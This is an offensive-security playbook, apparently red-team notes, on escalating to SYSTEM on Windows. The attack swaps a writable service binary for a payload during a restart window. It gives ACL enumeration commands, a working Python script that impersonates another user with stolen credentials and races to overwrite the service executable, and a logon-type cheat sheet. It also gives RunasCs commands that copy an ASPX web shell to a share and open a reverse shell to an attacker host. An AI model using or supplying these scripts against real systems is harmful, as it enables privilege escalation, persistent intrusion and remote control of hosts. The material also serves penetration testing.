# Writable Service Binary (Race Condition Hijack)

## When this applies

- Many internally-developed / "prototype" Windows services install their executable into a directory where a non-admin domain user has WRITE permission (inherited ACLs, custom installer mistakes).
- When the service is running, the `.exe` is locked by the SCM — you cannot overwrite it.
- The classical `sc config <svc> binpath= ...` requires service-config write access. The underused primitive is **racing a service restart window** to overwrite the binary during the brief unlock period.

## Preconditions

- `icacls "C:\Path\To\Service.exe"` shows `(I)(M)` or `(I)(RX,W)` or `(F)` for a user/group the attacker can impersonate.
- A trigger exists that stops+restarts the service periodically (automation bot, watchdog, scheduled task, user-initiated action, service log entries showing cyclic restarts). Check the service's own log files for a timing pattern.
- Attacker has code execution as the low-priv web/service account AND a credential (or token) for a second user that holds write access to the binary — or is themselves that user.

## Identification

```cmd
:: Enumerate ACLs on all service binaries
for /f "tokens=2 delims==" %i in ('wmic service get PathName /value ^| findstr "="') do @icacls "%~i" 2>nul | findstr /i "Users Everyone Authenticated %USERNAME%"

:: Check writable paths referenced by services (PowerShell alternative)
Get-WmiObject win32_service | Select Name,PathName,StartName | ForEach-Object {
    $p = ($_.PathName -replace '"','' -split ' ')[0]
    if (Test-Path $p) {
        $acl = Get-Acl $p
        $acl.Access | Where-Object {$_.FileSystemRights -match 'Write|Modify|FullControl'}
    }
}
```

Also check service log directories for patterns like `Service is starting` / `Service is stopped` timestamps — regular intervals confirm an auto-restart cycle.

## Race Condition Exploit Pattern

The attacker:

1. Impersonates the user who holds write access to the binary (see Windows File Operation Impersonation section below).
2. Tails the service's log file for the "stopping" / "service stopped" marker.
3. Loops `CopyFile` on the binary with short sleeps — succeeds within the ~1-3 second window between service stop and restart.
4. Next restart executes attacker's payload as whatever account the service runs as (often `LocalSystem`).

```python
import os, time, shutil, win32security, win32con

# Impersonate user with write access
hToken = win32security.LogonUser(
    "Olivia.KAT", "DOMAIN", "PASSWORD",
    win32con.LOGON32_LOGON_INTERACTIVE,
    win32con.LOGON32_PROVIDER_DEFAULT)
win32security.ImpersonateLoggedOnUser(hToken)

src = r"C:\web\writable\payload.exe"
dst = r"C:\Program Files\Vendor\Service\service.exe"
logpath = r"C:\Program Files\Vendor\Service\Logs\ServiceLog.txt"

log_size = os.path.getsize(logpath)
start = time.time()
while time.time() - start < 600:             # wait up to 10 min for stop window
    new_size = os.path.getsize(logpath)
    if new_size > log_size:
        with open(logpath, 'r') as lf:
            lf.seek(log_size); new = lf.read()
        if "Service is stopped" in new or "stopping" in new.lower():
            for attempt in range(30):        # race the restart
                try:
                    shutil.copy2(src, dst)
                    break
                except OSError as e:
                    if "32," in str(e):      # sharing violation — still locked
                        time.sleep(0.05)
                    else:
                        raise
        log_size = new_size
    time.sleep(0.3)
win32security.RevertToSelf()
```

## Why Not `sc config` / `sc stop`

- `sc config` requires `SERVICE_CHANGE_CONFIG` — usually reserved for admins.
- `sc stop` requires `SERVICE_STOP` — often not granted to the user.
- The **binary file ACL** is a completely separate check. A user can have write access to the `.exe` file without having any service control rights. That's the gap this exploits.

## Fallbacks If No Auto-Restart Trigger

- `MoveFileEx(dst, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)` — schedules rename at next boot via `PendingFileRenameOperations`. Requires eventual reboot.
- Wait for scheduled reboots (patch windows) or crash the service (if there's a known crash vector) to force a restart.
- If you have credentials for any account with `SeShutdownPrivilege` on the box, reboot to force replacement.

## Windows File Operation Impersonation (Non-Admin)

When you have cleartext credentials for a second Windows user but cannot spawn a process as that user (missing `SeAssignPrimaryTokenPrivilege`, blocked by AppLocker, no WinRM/SMB, `Log on as batch job` denied), you can still **perform file I/O as that user** by impersonating their logon token in your own process thread.

`ImpersonateLoggedOnUser` only requires `SeImpersonatePrivilege` (granted to most service accounts including `IIS APPPOOL\*`, `NETWORK SERVICE`, and many web workers) OR the special case of having the target user's cleartext creds via `LogonUser`, which can **always be called** by any process with `SeChangeNotifyPrivilege` (default for all users).

```python
import win32security, win32con

# LOGON32_LOGON_INTERACTIVE = works for file ops on local resources (required for CopyFile)
# LOGON32_LOGON_NEW_CREDENTIALS = network-only, CopyFile/local file ops return ERROR_ACCESS_DENIED (5)
hToken = win32security.LogonUser(
    "Username", "DOMAIN", "Password",
    win32con.LOGON32_LOGON_INTERACTIVE,
    win32con.LOGON32_PROVIDER_DEFAULT)

win32security.ImpersonateLoggedOnUser(hToken)
# All subsequent file I/O on this thread runs as the impersonated user
# shutil.copy2, open(), os.remove, win32file.CreateFile, etc.
win32security.RevertToSelf()
```

### Logon Type Cheat Sheet

| `LOGON32_LOGON_*` | Use For | File I/O on Local Paths |
|---|---|---|
| `INTERACTIVE` | Local file ops, full token | ✓ Works |
| `NETWORK` | SMB/network resources only | ✗ Access denied |
| `NETWORK_CLEARTEXT` | Like NETWORK but creds cached | ✗ Access denied on most local paths |
| `NEW_CREDENTIALS` | Only uses creds when hitting network | ✗ Local ops use calling user |
| `BATCH` | Requires `SeBatchLogonRight` | Often denied for normal users |
| `SERVICE` | Requires `SeServiceLogonRight` | Rarely granted |

**Rule of thumb**: for local file writes, always start with `INTERACTIVE`.

## RunasCs.exe — When You Just Want a Shell as User B

If Python/win32 isn't available (limited webshell, no Python on target) and `runas /netonly` is blocked or requires interactive Window Station, drop a single binary. RunasCs (https://github.com/antonioCoco/RunasCs) implements the LogonUser → CreateProcess dance with a usable logon-type matrix and works from any service-context shell.

```cmd
:: Logon type 9 (NETONLY / NEW_CREDENTIALS) — no SeAssignPrimaryToken needed,
:: creds are used ONLY for outbound network auth; local ops still as caller.
:: Use this when you only need to read/write SMB shares user B has access to.
RunasCs.exe DOMAIN\userB password -l 9 cmd.exe /c "copy attacker.aspx \\host\Web\shell.aspx"

:: Logon type 2 (INTERACTIVE) — full token, works for local file ops too,
:: but needs window-station rights (often missing in IIS apppool context).
RunasCs.exe DOMAIN\userB password -l 2 cmd.exe /c "whoami /all"

:: Reverse-shell variant (no Sliver/Meterpreter needed)
RunasCs.exe DOMAIN\userB password -l 9 -r ATTACKER:4444 cmd.exe
```

Logon-type 9 is the right default for "I just need to write to an SMB share that only userB can write to". It avoids the `SeAssignPrimaryTokenPrivilege` requirement that blocks `runas` and `psexec`.

## Verifying success

- After the next service restart, the attacker payload runs as the service principal (often LocalSystem).
- `whoami` returns `nt authority\system` from the resulting shell.

## Common pitfalls

- `MoveFileEx ... MOVEFILE_DELAY_UNTIL_REBOOT` requires an eventual reboot — slow on production hosts.
- LogonType 9 (NEW_CREDENTIALS) is network-only — local CopyFile fails. Use type 2 (INTERACTIVE) for local writes.

## Tools

- pywin32 (impersonation)
- RunasCs.exe
- icacls
